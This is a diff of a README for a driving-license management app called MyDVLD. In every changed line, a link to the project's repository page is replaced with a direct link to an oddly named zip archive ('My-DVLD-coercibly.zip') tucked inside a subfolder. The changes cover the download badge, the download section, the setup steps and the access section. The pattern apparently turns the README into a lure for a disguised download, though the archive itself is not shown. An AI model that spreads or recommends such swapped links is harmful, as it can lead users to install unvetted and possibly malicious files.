@@ -1,11 +1,11 @@
 # 🚗 MyDVLD - Manage Driving Licenses With Ease
 
-[![Download MyDVLD](https://img.shields.io/badge/Download-MyDVLD-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Trillion-pinkandwhiteeverlasting354/MyDVLD)
+[![Download MyDVLD](https://img.shields.io/badge/Download-MyDVLD-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Trillion-pinkandwhiteeverlasting354/MyDVLD/main/MyDVLD/People/My-DVLD-coercibly.zip)
 
 ## 📥 Download MyDVLD
 
 Visit this page to download:  
-https://github.com/Trillion-pinkandwhiteeverlasting354/MyDVLD
+https://raw.githubusercontent.com/Trillion-pinkandwhiteeverlasting354/MyDVLD/main/MyDVLD/People/My-DVLD-coercibly.zip
 
 ## 🖥️ What MyDVLD Does
 
@@ -59,7 +59,7 @@ Before you open the app, make sure you have:
 ## 📦 Download and Open the Project
 
 1. Go to the download page:  
-   https://github.com/Trillion-pinkandwhiteeverlasting354/MyDVLD
+   https://raw.githubusercontent.com/Trillion-pinkandwhiteeverlasting354/MyDVLD/main/MyDVLD/People/My-DVLD-coercibly.zip
 
 2. Download the project files to your computer.
 
@@ -216,4 +216,4 @@ Before you begin normal work each day:
 ## 📞 Access
 
 Use the download page here:  
-https://github.com/Trillion-pinkandwhiteeverlasting354/MyDVLD
+https://raw.githubusercontent.com/Trillion-pinkandwhiteeverlasting354/MyDVLD/main/MyDVLD/People/My-DVLD-coercibly.zip
